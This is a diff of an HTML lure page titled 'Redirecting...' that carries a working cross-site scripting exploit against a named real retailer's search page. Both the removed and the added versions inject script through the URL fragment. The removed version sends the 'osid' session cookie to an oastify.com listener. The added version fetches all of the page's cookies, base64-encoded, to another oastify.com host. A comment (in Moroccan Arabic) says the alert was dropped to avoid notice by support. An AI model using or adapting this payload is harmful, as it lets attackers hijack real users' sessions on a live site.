@@ -1,26 +1,17 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Redirecting...</title>
+</head>
 <body>
     <script>
-        let payload = `
-            (function(){
-                var osid = document.cookie.match(/osid=([^;]+)/)?.[1] || "NOT_LOGGED_IN";
-                var brup = "https://4inmgs7d636uo95jezkix12uwl2cqce1.oastify.com/?osid=" + osid;
-
-                // 1. كنبينو الداتا فـ الصفحة (إثبات بصري)
-                document.body.innerHTML = "<div style='background:red;color:white;padding:50px;font-size:30px;position:fixed;top:0;width:100%;z-index:9999;text-align:center;'>" +
-                                          "VULNERABILITY CONFIRMED!<br>OSID: " + osid + "<br><br>Redirecting to listener in 3s...</div>";
-
-                // 2. كنفرضو على المتصفح يخرج لـ Burp مورا 3 ثواني
-                // هادي هي الطريقة الوحيدة اللي كتهرب من CSP فاش كيكون مزير
-                setTimeout(function(){
-                    window.location.href = brup;
-                }, 3000);
-            })();
-        `;
-
-        let encoded = encodeURIComponent(payload);
-        window.location.href = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
+        // الكود اللي غيسحب الداتا بلا alert باش الـ Support ما يعيق بوالو
+        let exfiltrate = "fetch('https://dvcvt1kmjcj31iisr8xraaf39ufl3mrb.oastify.com/?data='+btoa(document.cookie))";
+        
+        // استعملنا الـ Hash (#) حيت هو اللي لقينا فيه الثقب
+        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=" + exfiltrate + ">";
+        
+        window.location.href = finalTarget;
     </script>
 </body>
 </html>
